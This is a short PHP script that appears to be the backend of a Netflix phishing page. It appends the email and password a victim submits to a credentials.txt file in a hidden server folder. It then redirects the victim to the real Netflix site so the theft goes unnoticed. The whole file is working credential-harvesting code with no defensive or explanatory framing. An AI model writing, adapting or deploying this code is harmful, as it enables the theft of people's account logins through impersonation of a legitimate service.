<?php
file_put_contents("../../.server/credentials.txt", "Netflix Login\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Email: " . $_POST['email'] . "\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Password: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
?>
